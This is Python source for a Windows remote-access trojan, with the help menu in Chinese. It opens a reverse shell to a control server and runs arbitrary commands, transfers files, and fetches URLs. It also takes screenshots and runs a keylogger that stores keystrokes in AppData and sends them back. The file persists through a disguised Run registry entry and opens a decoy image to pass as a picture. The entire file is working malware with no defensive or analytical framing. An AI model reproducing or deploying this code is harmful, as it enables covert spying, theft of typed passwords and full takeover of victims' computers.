import socket
import subprocess
import json
import time
import os
import sys
import shutil
import base64
import requests
from mss import mss
import threading
import pynput.keyboard

server_ip = "localhost"
server_port = 54321
file_location = os.environ["appdata"] + "\\srv.exe"
image_file = "\\image.png"
keylog_file = os.environ["appdata"] + "\\srv.txt"
captured_keys = ""

def process_keys(key):
    """
    Process the captured key and append it to the global variable `captured_keys`.

    Parameters:
    key (pynput.keyboard.Key): The key that was pressed.

    Returns:
    None
    """
    global captured_keys
    try:
        captured_keys += str(key.char)
    except AttributeError:
        if key == key.space:
            captured_keys += " "
        elif key == key.enter:
            captured_keys += "\n"
        elif key in [key.up, key.down, key.left, key.right]:
            exit

def write_keys():
    """
    Writes the captured keys to a file and clears the captured_keys variable.
    Starts a timer to call the write_keys function again after 5 seconds.
    """
    global captured_keys
    with open(keylog_file, "a") as kl_file:
        kl_file.write(captured_keys)
        captured_keys = ""
    timer = threading.Timer(5, write_keys)
    timer.start()

def keylogger_start():
    """
    Starts the keylogger by creating a keyboard listener and joining it.
    """
    keyboard_listener = pynput.keyboard.Listener(on_press=process_keys)
    with keyboard_listener:
        write_keys()
        keyboard_listener.join()

def send_data(data):
    """
    Sends the provided data to the server.

    Args:
        data: The data to be sent.

    Returns:
        None
    """
    json_data = json.dumps(data)
    s.send(bytes(json_data, encoding="utf-8"))

def receive_data():
    """
    Receive data from the server.

    This function receives data from the server by continuously receiving chunks of data
    and appending them to a bytearray until a complete JSON object is received. It then
    converts the JSON data to a Python object and returns it.

    Returns:
        dict: The received data as a Python dictionary.

    Raises:
        ValueError: If the received data is not a valid JSON object.
    """
    json_data = bytearray()
    while True:
        try:
            json_data += s.recv(1024)
            return json.loads(json_data)
        except ValueError:
            continue

def establish_connection():
    """
    Establishes a connection with the server and handles communication.

    This function continuously tries to establish a connection with the server
    specified by `server_ip` and `server_port`. Once the connection is established,
    it calls the `handle_communication` function to handle the communication with the server.

    If an exception occurs during the connection attempt, the function sleeps for 20 seconds
    before trying again.

    Note: Make sure to set the values of `server_ip` and `server_port` before calling this function.

    """
    while True:
        try:
            s.connect((server_ip, server_port))
            handle_communication()
        except:
            time.sleep(20)

def handle_communication():
    while True:
        command = receive_data()
        if command == "q":
            try:
                os.remove(keylog_file)
            except:
                continue
            break
        elif command[:4] == "help":
            help_details = ("cd <path>             - 變更目錄\n"
                            "download <filename>   - 從客戶端下載文件到服務器\n"
                            "upload <filename>     - 從服務器上傳文件到客戶端\n"
                            "get <url>             - 從網址下載文件\n"
                            "start <program>       - 啟動程序\n"
                            "screenshot            - 截取螢幕快照\n"
                            "check                 - 檢查管理員權限\n"
                            "keylog_start          - 開始鍵盤記錄\n"
                            "keylog_dump           - 顯示鍵盤記錄數據\n"
                            "<command>             - 執行CMD命令\n"
                            "q                     - 退出")
            send_data(help_details)
        elif command[:2] == "cd" and len(command) > 1:
            try:
                os.chdir(command[3:])
            except:
                continue
        elif command[:8] == "download":
            with open(command[9:], "rb") as file_down:
                content = file_down.read()
                send_data(base64.b64encode(content).decode("ascii"))
        elif command[:3] == "get":
            try:
                url = command[4:]
                get_response = requests.get(url)
                file_name = url.split("/")[-1]
                with open(file_name, "wb") as out_file:
                    out_file.write(get_response.content)
                send_data("[+] File downloaded!")
            except:
                send_data("[!!] Download failed!")
        elif command[:6] == "upload":
            data = receive_data()
            with open(command[7:], "wb") as file_up:
                file_up.write(base64.b64decode(data))
        elif command[:5] == "start":
            try:
                subprocess.Popen(command[6:], shell=True)
                send_data("[+] Program started!")
            except:
                send_data("[!!] Program cannot start!")
        elif command[:10] == "screenshot":
            try:
                with mss() as screenshot:
                    screenshot.shot()
                with open("monitor-1.png", "rb") as ss:
                    send_data(base64.b64encode(ss.read()).decode("ascii"))
                os.remove("monitor-1.png")
            except:
                send_data("[!!] Failed to take screenshot!")
        elif command[:5] == "check":
            try:
                os.listdir(os.sep.join([os.environ.get('SystemRoot', 'C:\windows'), 'temp']))
                send_data("[bold green] [+] Great, you have admin privilege! [/bold green] :smiley:")
            except:
                send_data("[bold red] [!!] You do NOT have admin privilege! [/bold red] :pile_of_poo:")
        elif command[:12] == "keylog_start":
            kl_thread = threading.Thread(target=keylogger_start)
            kl_thread.start()
        elif command[:11] == "keylog_dump":
            with open(keylog_file, "r") as kl:
                send_data(kl.read())
        elif command[:3] == "pwd":
            send_data(os.getcwd())
        else:
            proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            response = proc.stdout.read() + proc.stderr.read()
            send_data(response.decode('cp950'))

if not os.path.exists(file_location):
    shutil.copyfile(sys.executable, file_location)
    subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v ServiceCheck /t REG_SZ /d "' + file_location + '"', shell=True)

img = sys._MEIPASS + image_file
try:
    subprocess.Popen(img, shell=True)
except:
    pass

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
establish_connection()
s.close()
